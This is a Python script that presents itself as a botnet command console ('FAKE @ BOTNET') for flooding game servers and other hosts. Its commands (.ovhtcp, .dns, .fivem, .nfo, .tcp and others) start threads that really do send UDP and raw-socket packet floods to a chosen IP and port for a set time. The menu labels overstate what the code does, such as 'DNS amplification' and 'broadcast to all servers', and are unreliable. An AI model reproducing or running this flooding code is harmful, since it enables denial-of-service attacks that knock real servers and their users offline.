#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "senengkan?"

methods = """
               \033[37m           ,MMM\033[35m8&&&.
               \033[37m      _...MMMMM\033[35m88&&&&..._
               \033[37m   .::'''MMMMM8\033[35m8&&&&&&'''::.
               \033[37m  ::     MMMMM8\033[35m8&&&&&&     ::
               \033[37m  '::....MMMMM8\033[35m8&&&&&&....::'
               \033[37m     `''''MMMMM\033[35m88&&&&''''`
               \033[37m           'MMM\033[35m8&&&'


[ LAYER - 4 ] 

– .DNS : Multiple Amplification Methods
– .OVHTCP : TCP OVH Interno Bypass
– .OVHUDP : UDP OVH Game Bypass
– .FIVEM : Game Flood Optimized For FM
– .TCP : TCP Socket Flood and SYN-ACK
– .NFO : SYN Flood + Raw UDP + Handshake
– .R6DROP : Game Flood Optimized For R6
– .RNDROP : Game Flood Optimized For FN
– .SSH-DOWN : SSH V1/1.1/2 Flood

[ EXAMPLE ATTACK ]

– .DNS:  [ IP ] [ PORT ] [ TIME ]
– .OVHTCP: [ IP ] [ PORT ] [ TIME ]
– .OVHUDP: [ IP ] [ PORT ] [ TIME ]
– .FIVEM [ IP ] [ PORT ] [ TIME ]
– .TCP [ IP ] [ PORT ] [ TIME ]
– .NFO: [ IP ] [ PORT ] [ TIME ]
– .R6DROP: [ IP ] [ PORT ] [ TIME ]
– .RNDROP: [ IP ] [ PORT ] [ TIME ]
– .SSHDOWN: [ IP ] [ PORT ] [ TIME ]
 """



banner =  """
Welcome - PAKAI NAMA KAMU YA [ C2 ].
Founded By Ceow 
Version, 1.1
2022 - 2023
\x1b[1;37mᴘʟᴇᴀsᴇ ᴛʏᴘᴇ " 𝓶𝓮𝓽𝓱𝓸𝓭𝓼 " ᴛᴏ sᴇᴇ ᴀʟʟ ᴛʜᴇ ᴍᴇᴛʜᴏᴅs.
"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(32500,41500))
		sys.stdout.write("\x1b]2; FAKEBOTNETCEOW. | Devices: [{}] | Spoofed Servers [19] | Server Units [8] | Clients: [18]\x07".format (bots))
		sin = input("\033[0;30;45mFAKE @ BOTNET\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "methods":
			os.system ("")
			print (methods)
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == ".ovhtcp":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[1;37;40mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".dns":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".ovhudp":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mServer...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".sshdown":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".fivem":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == ".nfo":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".tcp":
			try:
				if running >= 991:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 2048
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully sent attack to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".rndrop":
			try:
				if running >= 999:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 50000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == ".r6drop":
			try:
				if running >= 1:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1460
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[97mSuccessfully broadcast to all \033[31mYou \033[37mservers...")
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()

